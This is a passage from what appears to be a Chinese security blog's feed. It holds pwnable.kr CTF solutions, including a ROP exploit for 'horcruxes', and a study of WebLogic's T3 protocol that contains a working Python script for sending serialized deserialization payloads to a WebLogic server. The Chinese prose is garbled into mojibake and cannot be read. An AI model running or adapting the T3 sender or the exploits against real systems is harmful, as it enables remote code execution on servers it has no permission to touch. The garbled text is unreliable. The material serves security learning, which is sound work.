punctuation">(</span>password<span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> fp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"guess the password!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">fgets</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">strcmp</span><span class="token punctuation">(</span>password<span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"congrats! here is your flag: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">calc_flag</span><span class="token punctuation">(</span>password<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"wrong guess!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><h3 id="ÂàÜÊûê-19"><a href="#ÂàÜÊûê-19" class="headerlink" title="ÂàÜÊûê"></a>ÂàÜÊûê</h3><p>‚Ä¶ËÑëÊ¥ûÈ¢òÔºåpassword‰∏∫<code>cat: password: Permission denied</code>ÔºåÂ∞±ÊòØ‰∏∫‰∫ÜÊèêÈÜíÊ≥®ÊÑèÊñá‰ª∂ÊùÉÈôê</p><h3 id="Ëß£È¢ò-19"><a href="#Ëß£È¢ò-19" class="headerlink" title="Ëß£È¢ò"></a>Ëß£È¢ò</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>s <span class="token operator">=</span> ssh<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'pwnable.kr'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">2222</span><span class="token punctuation">,</span> user<span class="token operator">=</span><span class="token string">'blukat'</span><span class="token punctuation">,</span> password<span class="token operator">=</span><span class="token string">'guest'</span><span class="token punctuation">)</span>p <span class="token operator">=</span> s<span class="token punctuation">.</span>process<span class="token punctuation">(</span><span class="token string">"/home/blukat/blukat"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"guess the password!\n"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"cat: password: Permission denied"</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><h2 id="21-horcruxes"><a href="#21-horcruxes" class="headerlink" title="21. horcruxes"></a>21. horcruxes</h2><h3 id="È¢òÁõÆ-20"><a href="#È¢òÁõÆ-20" class="headerlink" title="È¢òÁõÆ"></a>È¢òÁõÆ</h3><p>ÈúÄË¶Å<code>sudo apt install libseccomp-dev:i386</code></p><h3 id="ÂàÜÊûê-20"><a href="#ÂàÜÊûê-20" class="headerlink" title="ÂàÜÊûê"></a>ÂàÜÊûê</h3><p>Êúâ‰∏™Âêç‰∏∫ ropme ÁöÑÂáΩÊï∞Ôºå‰∏ªË¶ÅÂÖ≥Ê≥®ËøôÈáåÔºåÂÖ∂ÂäüËÉΩÂà§Êñ≠ËæìÂÖ•ÂÄºÊòØÂê¶‰∏∫ sumÔºåÊòØÁöÑËØùÂàôËøîÂõû flag<br>ÂèØ‰ª•ÊòéÊòæÁúãÂà∞Êï∞ÁªÑ<code>s</code>ÊúâÊ∫¢Âá∫Ôºå‰ΩÜÊòØÊÄé‰πàÂà©Áî®Âë¢Ôºü</p><ol><li>Áõ¥Êé•ÊéßÂà∂ ropme ËøîÂõûÂú∞ÂùÄÂà∞ open flag ÁöÑÂú∞ÂùÄ</li><li>Ëé∑Âèñ a~g ÁöÑÂèòÈáèÂÄºÈÄöËøá sum È™åËØÅ</li></ol><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/d4fb29f2/15921305968734.jpg" alt="-w469"></p><p>È¶ñÂÖàÊ£ÄÊü•ÁúãÂà∞ÊòØÊ≤°ÊúâÂºÄÂêØ ASLR Âú∞ÂùÄÊòØÂõ∫ÂÆöÂà©Áî®ÁöÑÔºåÊé•ÁùÄÂæÄ‰∏ãËµ∞</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/d4fb29f2/15921446659641.jpg" alt="-w307"></p><p>Á¨¨‰∏ÄÁßçÊñπÊ≥ï‰∏≠ÔºåÁî±‰∫éË∑≥ËΩ¨Âú∞ÂùÄÂê´Êúâ<code>0x0a</code>ÂØºËá¥Êó†Ê≥ïÊúâÊïà‰ªé gets ËæìÂÖ•ÔºåÊâÄ‰ª•Âè™ËÉΩËÄÉËôëÁ¨¨‰∫åÁßçÊñπÊ≥ï</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/d4fb29f2/15921431564969.jpg" alt="-w469"></p><p>Êàë‰ª¨ÁúãÂà∞ A~G ÂáΩÊï∞ÈÉΩÊòØÊó†ÂèÇÂáΩÊï∞Ôºå‰∏îÊâßË°å printf Âêé ret ËøîÂõûÔºåÊâÄ‰ª•Âú®Ê†à‰∏äË°®Áé∞‰∏∫ËøîÂõûÊâßË°åÂéüÂáΩÊï∞‰∏ã‰∏ÄÂú∞ÂùÄÊåá‰ª§</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/d4fb29f2/15921433549736.jpg" alt="-w474"></p><p>Êàë‰ª¨ÈÄöËøáÊääÊ†àË¶ÜÁõñÂ¶Ç‰∏ãÔºåÂΩìËæìÂÖ•‰∏çÁ≠â‰∫é sum Êó∂Ôºåropme Âç≥‰ºöË∑≥ËΩ¨Ë∞ÉÁî® A ÂáΩÊï∞ËæìÂá∫ aÔºåÂΩì‰ªé A ÂáΩÊï∞ËøîÂõûÊó∂‰æø‰ºöË∞ÉÁî® B ÂáΩÊï∞‚Ä¶‚Ä¶ÂΩì A~G ÈÉΩÊâßË°åÂÆåÊØïÂêéËÆ°ÁÆó sum ÂÄºÔºåÂÜçÊ¨°Ë∞ÉÂõû ropme ËæìÂÖ•Ê≠£Á°ÆÁ≠îÊ°àÂç≥ÂèØ</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/d4fb29f2/15921442969783.jpg" alt="-w304"></p><h3 id="Ëß£È¢ò-20"><a href="#Ëß£È¢ò-20" class="headerlink" title="Ëß£È¢ò"></a>Ëß£È¢ò</h3><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'i386'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">)</span>is_remote <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> is_remote<span class="token punctuation">:</span>    p <span class="token operator">=</span> remote<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'pwnable.kr'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">9032</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"/home/pwn/Desktop/horcruxes"</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> b<span class="token string">'.'</span> <span class="token operator">*</span> <span class="token number">0x78</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0x809fe4b</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># A</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0x809fe6a</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># B</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0x809fe89</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># C</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0x809fea8</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># D</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0x809fec7</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># E</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0x809fee6</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># F</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0x809ff05</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># G</span>payload <span class="token operator">+=</span> p32<span class="token punctuation">(</span><span class="token number">0x809fffc</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># ropme</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Select Menu:"</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"How many EXP did you earned? : "</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>sum <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    msg <span class="token operator">=</span> p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>    num <span class="token operator">=</span> int<span class="token punctuation">(</span>msg<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token string">')\n'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'+'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    sum <span class="token operator">+=</span> nump<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Select Menu:"</span><span class="token punctuation">,</span> <span class="token string">'1'</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"How many EXP did you earned? : "</span><span class="token punctuation">,</span> str<span class="token punctuation">(</span>sum<span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><h2 id="ÂèÇËÄÉ"><a href="#ÂèÇËÄÉ" class="headerlink" title="ÂèÇËÄÉ"></a>ÂèÇËÄÉ</h2><ol><li><a href="http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/" target="_blank" rel="noopener">LINUX SYSTEM CALL TABLE FOR X86 64</a></li><li><a href="https://introspelliam.github.io/2017/09/30/linux%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%B8%B8%E7%94%A8%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/" target="_blank" rel="noopener">linuxÁ®ãÂ∫èÁöÑÂ∏∏Áî®‰øùÊä§Êú∫Âà∂</a></li><li><a href="http://0x4c43.cn/2017/1024/linux-memory-management-and-heap/" target="_blank" rel="noopener">Linux ÂÜÖÂ≠òÁÆ°ÁêÜ‰∏éÂ†Ü</a></li><li><a href="https://segmentfault.com/a/1190000005118060" target="_blank" rel="noopener">LinuxÂ†ÜÂÜÖÂ≠òÁÆ°ÁêÜÊ∑±ÂÖ•ÂàÜÊûêÔºà‰∏äÔºâ</a></li><li><a href="https://segmentfault.com/a/1190000005183474" target="_blank" rel="noopener">LinuxÂ†ÜÂÜÖÂ≠òÁÆ°ÁêÜÊ∑±ÂÖ•ÂàÜÊûêÔºà‰∏ãÔºâ</a></li><li><a href="https://wiki.x10sec.org/pwn/heap/heap_implementation_details/" target="_blank" rel="noopener">Ê∑±ÂÖ•ÁêÜËß£Â†ÜÁöÑÂÆûÁé∞</a></li><li><a href="https://www.bilibili.com/video/av200358962/" target="_blank" rel="noopener">‰ªéÊ†àÊ∫¢Âá∫ÂºÄÂßãÔºåÊïô‰Ω†ÂÜôShellcodeÂíåROPÈìæ</a></li></ol>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Â•Ω‰πÖÊ≤°Êõ¥Êñ∞ÔºåËèúÈ∏°Â≠¶ pwn&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="pwn" scheme="https://blog.sari3l.com/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>Weblogic T3 ÂçèËÆÆÂ≠¶‰π†</title>
    <link href="https://blog.sari3l.com/posts/ecb4dfa2/"/>
    <id>https://blog.sari3l.com/posts/ecb4dfa2/</id>
    <published>2020-04-01T08:16:44.000Z</published>
    <updated>2020-07-06T09:45:06.127Z</updated>
    
    <content type="html"><![CDATA[<h2 id="How-to-Implement-WebLogic-RMI"><a href="#How-to-Implement-WebLogic-RMI" class="headerlink" title="How to Implement WebLogic RMI"></a>How to Implement WebLogic RMI</h2><p>È¶ñÂÖàÊûÑÈÄ† rmi ÊúçÂä°Á´ØÔºå‰ª•‰æøËßÇÂØüÊï∞ÊçÆÂåÖ</p><p>Ê†πÊçÆ<a href="https://docs.oracle.com/middleware/1213/wls/WLRMI/rmi_imp.htm#WLRMI146" target="_blank" rel="noopener">ÂÆòÊñπÊñáÊ°£</a>ÔºåÁõ¥Êé•ÁîüÊàê jar ÂåÖ</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/ecb4dfa2/15852292974954.jpg" alt="-w775"></p><p>Â∞ÜÁîüÊàêÁöÑjarÂåÖÊîæÂà∞ÊµãËØïdomainÁöÑlibÁõÆÂΩï‰∏ã</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/ecb4dfa2/15852293246061.jpg" alt="-w752"></p><p>Â∞ÜÁõÆÊ†á<code>server</code>Á±ªÈÖçÁΩÆ‰∏∫ÂêØÂä®Á±ª</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/ecb4dfa2/15852293730424.jpg" alt="-w988"></p><p>ÈáçÂêØ weblogic ÂêéÂç≥ÂèØËøõË°åË∞ÉÁî®</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/ecb4dfa2/15852294460930.jpg" alt="-w666"></p><h2 id="ÊµÅÈáèËß£Êûê"><a href="#ÊµÅÈáèËß£Êûê" class="headerlink" title="ÊµÅÈáèËß£Êûê"></a>ÊµÅÈáèËß£Êûê</h2><p>Á∫¢Ëâ≤ÈÉ®ÂàÜ‰∏∫ request<br>ËìùËâ≤ÈÉ®ÂàÜ‰∏∫ response</p><p>P.S. Ê≠§ËäÇÂΩìÊó∂Áî®‰∫Ü12.1.3.0.0ÁâàÊú¨ÔºåÊú¨ÊñáÂÖ∂‰ªñÂÜÖÂÆπÂùá‰∏∫12.2.1.4.0ÁâàÊú¨</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/ecb4dfa2/15852305401102.jpg" alt="-w1120"></p><p>ÈÄöËøá<code>ac ed 00 05</code>Á≠õÈÄâÂá∫ËØ∑Ê±ÇÂèçÂ∫èÂàóÂåñÈÉ®ÂàÜ‰æùÊ¨°‰∏∫</p><pre class=" language-plain"><code class="language-plain">weblogic.rjvm.ClassTableEntryweblogic.rjvm.ClassTableEntryweblogic.rjvm.ClassTableEntryweblogic.rjvm.JVMIDweblogic.rjvm.JVMID---weblogic.rjvm.ClassTableEntryweblogic.rjvm.ImmutableServiceContext---weblogic.rjvm.ImmutableServiceContext</code></pre><h2 id="T3-ÂçèËÆÆÂà©Áî®"><a href="#T3-ÂçèËÆÆÂà©Áî®" class="headerlink" title="T3 ÂçèËÆÆÂà©Áî®"></a>T3 ÂçèËÆÆÂà©Áî®</h2><p>Ê†πÊçÆÊï∞ÊçÆÂåÖËØ∑Ê±ÇÂÜÖÂÆπÔºåÊàë‰ª¨‰∏ª‰ΩìÈúÄË¶ÅÂàÜ‰∏∫‰∏§ÈÉ®ÂàÜËøõË°åÂèëÈÄÅ</p><ol><li><p>Êè°Êâãü§ù</p><pre class=" language-plain"><code class="language-plain"> t3 12.2.1\nAS:255\nHL:19\nMS:10000000\nPU:t3://10.211.55.20:7001\nLP:DOMAIN\n\n</code></pre></li><li><p>Â∫èÂàóÂåñÊï∞ÊçÆ</p><p> ËøôÈáåÊ∂âÂèä‰∏§ÁßçÊñπÂºèÔºåÂÆûÈôÖ‰∏ä‰πüÁÆóÊòØÂêå‰∏ÄÁßç</p><ol><li><p>Â∞Ü‰∏äÈù¢ÊèêÂà∞ÁöÑÂ∫èÂàóÂåñÈÉ®ÂàÜÂÖ∂‰∏≠‰∏ÄÈ°πÊîπ‰∏∫ÊÅ∂ÊÑè payload</p></li><li><p>ÂèñÊ∂àÊâÄÊúâÂ∫èÂàóÂåñÈÉ®ÂàÜÔºåÂú®‰∏ãÈù¢Êï∞ÊçÆÂêéÁõ¥Êé•ÊãºÊé•ÊÅ∂ÊÑè payload</p><pre><code>000005fe016501ffffffffffffffff000000710000ea60000000184f0fb5416958bf21f2810099d59af6a410012655b1f4c837027973720078720178720278700000000c00000002000000000000000400000001007070707070700000000c00000002000000000000000400000001007006fe010000</code></pre><p> <img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/ecb4dfa2/15852751007483.jpg" alt="-w647"></p></li></ol></li></ol><p>ÊúÄÁÆÄÂçïÁöÑÊÉÖÂÜµÂΩìÁÑ∂ÊòØÂêéËÄÖÔºå‰∏ãÈù¢ÊòØÂà©Áî®ËÑöÊú¨ÔºåÊ≥®ÊÑèÂ§¥ 4 Â≠óËäÇ‰∏∫Êï∞ÊçÆÊÄªÈïøÂ∫¶</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> socket<span class="token keyword">import</span> struct<span class="token keyword">import</span> sys<span class="token keyword">def</span> <span class="token function">send</span><span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port<span class="token punctuation">,</span> file<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        sock <span class="token operator">=</span> socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>        sock<span class="token punctuation">.</span>settimeout<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>        server <span class="token operator">=</span> <span class="token punctuation">(</span>ip<span class="token punctuation">,</span> port<span class="token punctuation">)</span>        sock<span class="token punctuation">.</span>connect<span class="token punctuation">(</span>server<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># Handshake</span>        handshake <span class="token operator">=</span> b<span class="token string">"t3 12.2.1\nAS:255\nHL:19\nMS:10000000\nPU:t3://10.211.55.20:7001\nLP:DOMAIN\n\n"</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[>] Sending: %s"</span> <span class="token operator">%</span> handshake<span class="token punctuation">)</span>        sock<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>handshake<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># Receive</span>        message <span class="token operator">=</span> sock<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[&lt;] Receive: %s"</span> <span class="token operator">%</span> message<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># Send Payload</span>        Obj <span class="token operator">=</span> open<span class="token punctuation">(</span>file<span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>        payload <span class="token operator">=</span> b<span class="token string">"\x00\x00\x05\xfe\x01\x65\x01\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00\x00\x71\x00\x00\xea\x60\x00\x00\x00\x18\x0f\xeb\x30\x46\x27\x2d\x8c\xc7\x52\x16\xbb\xd1\x9e\x42\x00\xdc\x6a\x8e\x80\xbe\xbb\x7e\xd5\xbe\x02\x79\x73\x72\x00\x78\x72\x01\x78\x72\x02\x78\x70\x00\x00\x00\x0c\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x01\x00\x70\x70\x70\x70\x70\x70\x00\x00\x00\x0c\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x01\x00\x70\x06\xfe\x01\x00\x00"</span>        payload <span class="token operator">+=</span> Obj        payload <span class="token operator">=</span> struct<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token string">">I"</span><span class="token punctuation">,</span> len<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> payload<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span>        <span class="token comment" spellcheck="true"># print("[*] Sending Payload: %s" % payload)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[>] Sending Payload ..."</span><span class="token punctuation">)</span>        sock<span class="token punctuation">.</span>sendall<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        <span class="token comment" spellcheck="true"># Receive</span>        message <span class="token operator">=</span> sock<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[&lt;] Receive: %s"</span> <span class="token operator">%</span> message<span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"[!] Error: %s"</span> <span class="token operator">%</span> e<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> len<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Usage: python t3protocol.py 127.0.0.1 7001 payload.bin"</span><span class="token punctuation">)</span>        exit<span class="token punctuation">(</span><span class="token punctuation">)</span>    send<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> int<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre><h2 id="T3-Ëß£ÊûêËøáÁ®ã"><a href="#T3-Ëß£ÊûêËøáÁ®ã" class="headerlink" title="T3 Ëß£ÊûêËøáÁ®ã"></a>T3 Ëß£ÊûêËøáÁ®ã</h2><p>‰∏∫‰∫Ü‰∏ãÊñ≠ÁÇπÔºåÂÖàÂ∞Ü src.zip Âä†ÂÖ•Âà∞ Classpath ‰∏≠</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/ecb4dfa2/15853030550115.jpg" alt="-w662"></p><pre class=" language-plain"><code class="language-plain">readObject:71, BadAttributeValueExpException (javax.management)invoke0:-1, NativeMethodAccessorImpl (sun.reflect)invoke:62, NativeMethodAccessorImpl (sun.reflect)invoke:43, DelegatingMethodAccessorImpl (sun.reflect)invoke:498, Method (java.lang.reflect)invokeReadObject:1158, ObjectStreamClass (java.io)readSerialData:2173, ObjectInputStream (java.io)readOrdinaryObject:2064, ObjectInputStream (java.io)readObject0:1568, ObjectInputStream (java.io)readObject:428, ObjectInputStream (java.io)readObject:73, InboundMsgAbbrev (weblogic.rjvm)read:45, InboundMsgAbbrev (weblogic.rjvm)readMsgAbbrevs:325, MsgAbbrevJVMConnection (weblogic.rjvm)init:219, MsgAbbrevInputStream (weblogic.rjvm)dispatch:557, MsgAbbrevJVMConnection (weblogic.rjvm)dispatch:666, MuxableSocketT3 (weblogic.rjvm.t3)dispatch:397, BaseAbstractMuxableSocket (weblogic.socket)readReadySocketOnce:993, SocketMuxer (weblogic.socket)readReadySocket:929, SocketMuxer (weblogic.socket)process:599, NIOSocketMuxer (weblogic.socket)processSockets:563, NIOSocketMuxer (weblogic.socket)run:30, SocketReaderRequest (weblogic.socket)execute:43, SocketReaderRequest (weblogic.socket)execute:147, ExecuteThread (weblogic.kernel)run:119, ExecuteThread (weblogic.kernel)</code></pre><p>ÂÖ∑‰ΩìËøáÁ®ãÂèØËßÅ<a href="https://www.anquanke.com/post/id/201432#h2-3" target="_blank" rel="noopener">https://www.anquanke.com/post/id/201432#h2-3</a><br>‰∏çÂÜçËµòËø∞</p><h2 id="ËøáÊª§Êú∫Âà∂"><a href="#ËøáÊª§Êú∫Âà∂" class="headerlink" title="ËøáÊª§Êú∫Âà∂"></a>ËøáÊª§Êú∫Âà∂</h2><h3 id="JEP290"><a href="#JEP290" class="headerlink" title="JEP290"></a><a href="https://openjdk.java.net/jeps/290" target="_blank" rel="noopener">JEP290</a></h3><blockquote><p>JEP290‰∏ªË¶ÅÊèèËø∞‰∫ÜËøô‰πàÂá†‰∏™Êú∫Âà∂Ôºö</p><ol><li>Êèê‰æõ‰∏Ä‰∏™ÈôêÂà∂ÂèçÂ∫èÂàóÂåñÁ±ªÁöÑÊú∫Âà∂ÔºåÁôΩÂêçÂçïÊàñËÄÖÈªëÂêçÂçï</li><li>ÈôêÂà∂ÂèçÂ∫èÂàóÂåñÁöÑÊ∑±Â∫¶ÂíåÂ§çÊùÇÂ∫¶</li><li>‰∏∫RMIËøúÁ®ãË∞ÉÁî®ÂØπË±°Êèê‰æõ‰∫Ü‰∏Ä‰∏™È™åËØÅÁ±ªÁöÑÊú∫Âà∂</li><li>ÂÆö‰πâ‰∏Ä‰∏™ÂèØÈÖçÁΩÆÁöÑËøáÊª§Êú∫Âà∂ÔºåÊØîÂ¶ÇÂèØ‰ª•ÈÄöËøáÈÖçÁΩÆpropertiesÊñá‰ª∂ÁöÑÂΩ¢ÂºèÊù•ÂÆö‰πâËøáÊª§Âô®</li></ol></blockquote><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/ecb4dfa2/15853581669600.jpg" alt="-w499"></p><h3 id="1-filterCheck-in-JDK"><a href="#1-filterCheck-in-JDK" class="headerlink" title="1. filterCheck in JDK"></a>1. filterCheck in JDK</h3><p>Êàë‰ª¨ÈÄöËøáÂú®8u151ÁâàÊú¨‰∏ãÂÆûÁé∞RMIÔºåÂπ∂Â∞ùËØïÁî®cc3ÂèçÂ∫èÂàóÂåñÊù•Êü•ÁúãÊú∫Âà∂Â¶Ç‰ΩïËøõË°åËøáÊª§</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/ecb4dfa2/15853596960053.jpg" alt="-w617"></p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/ecb4dfa2/15853599930145.jpg" alt="-w715"></p><p>Ë∑üÂÖ• checkInputÔºåserialFilter‰∏∫<code>sun.rmi.registry.RegistryImpl</code>ÂØπË±°ÔºåÊâÄ‰ª•ÂÆûÈôÖËøõÂÖ•Âà∞<code>rt.jar!sun.rmi.registry.RegistryImpl#registryFilter</code>ËøõË°åËøáÊª§</p><p>ÂèØ‰ª•ÁúãÂà∞ÂØπÊ∑±Â∫¶„ÄÅÊï∞ÁªÑÂ§ßÂ∞èÂíåÂü∫Êú¨Á±ªÂûãÂÅö‰∫ÜÂà§Êñ≠</p><p><img src="https://cdn.jsdelivr.net/gh/sari3l/sari3l.github.io/images/loading.gif" data-original="/posts/ecb4dfa2/15853607916582.jpg" alt="-w925"></p><p>‰ª•ÂèäÊúÄÂêéÁöÑËøôÊÆµ</p><pre class=" language-java"><code class="language-java">String<span class="token punctuation">.</span><span class="token keyword">class</span> <span class="token operator">!=</span> var2 <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>Number<span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">.</span><span class="token function">isAssignableFrom</span><span class="token punctuation">(</span>var2<span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>Remote<span class="token punctuation">.</span><span 